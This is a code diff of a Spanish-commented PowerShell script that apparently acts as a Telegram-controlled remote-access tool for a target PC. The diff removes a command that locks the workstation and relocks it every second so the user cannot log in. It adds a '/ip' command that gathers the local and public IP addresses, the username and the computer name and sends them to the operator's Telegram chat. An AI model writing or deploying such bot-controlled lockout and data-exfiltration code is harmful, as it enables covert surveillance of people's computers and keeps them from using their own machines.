@@ -119,39 +119,30 @@ while ($true) {
                             $wsh.SendKeys("{SHIFT}")
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Pantalla encendida en ID " + $MiIDNum })
                         }
-                      "/bloquear_pantalla" {
-    # 1. Lleva al usuario inmediatamente a la pantalla de login de Windows (Bloqueo de sesion)
-    $rundll = New-Object -ComObject WScript.Shell
-    $rundll.Run("rundll32.exe user32.dll,LockWorkStation")
-    
-    # 2. Bucle de proteccion forzada: Mientras el bloqueo este activo, si el usuario intenta iniciar sesion,
-    # el script detecta la sesion y vuelve a cerrarle la pantalla de inmediato en un ciclo continuo.
-    $global:BloqueoActivo = $true
-    $ScriptFreno = [scriptblock]{
-        while ($global:BloqueoActivo) {
-            # Si se detecta interaccion en el escritorio del usuario, vuelve a bloquear
-            rundll32.exe user32.dll,LockWorkStation
-            Start-Sleep -Seconds 1
-        }
+"/ip" {
+    # 1. Obtener la IP Local (de tu red Wi-Fi o cable de red)
+    $IPLocal = (Get-NetIPAddress -InterfaceAddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127*" -and $_.IPAddress -notlike "169*" }).IPAddress -join ", "
+    if ($null -eq $IPLocal -or $IPLocal -eq "") { $IPLocal = "No detectada" }
+
+    # 2. Obtener la IP Publica (la de internet de la empresa/casa) consultando un servidor web externo
+    $IPPublica = "Desconectado"
+    try {
+        $IPPublica = (Invoke-RestMethod -Uri "https://ipify.org" -TimeoutSec 5).Trim()
+    } catch {
+        # Si el servidor ipify falla, intenta con un servidor secundario de respaldo
+        try { $IPPublica = (Invoke-RestMethod -Uri "https://ifconfig.me" -TimeoutSec 5).Trim() } catch {}
     }
-    $Null = Start-Job -ScriptBlock $ScriptFreno
-    
-    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Equipo congelado en pantalla de inicio de sesion en ID " + $MiIDNum })
-}
 
-"/desbloquear_pantalla" {
-    # Apaga el bucle infinito de bloqueo para permitir el acceso normal del usuario
-    $global:BloqueoActivo = $false
-    Stop-Job * -ErrorAction SilentlyContinue
-    
-    # Despierta la pantalla simulando tecla para que el usuario pueda escribir su clave
-    $wsh = New-Object -ComObject WScript.Shell
-    $wsh.SendKeys("{SHIFT}")
-    
+    # 3. Armar el reporte de red plano
+    $ReporteIP = "DATOS DE RED DE LA PC`n`n" +
+                 "ID Numerico: [" + $MiIDNum + "]`n" +
+                 "Equipo: " + $User + "@" + $MiPC + "`n`n" +
+                 "• IP Local (Red): " + $IPLocal + "`n" +
+                 "• IP Publica (Internet): " + $IPPublica
 
-      
-    
-    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Cartel removido. Pantalla liberada en ID " + $MiIDNum })
+    # Enviar el reporte directamente a tu chat de Telegram
+    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = $ReporteIP })
+    continue
 }
 
                         
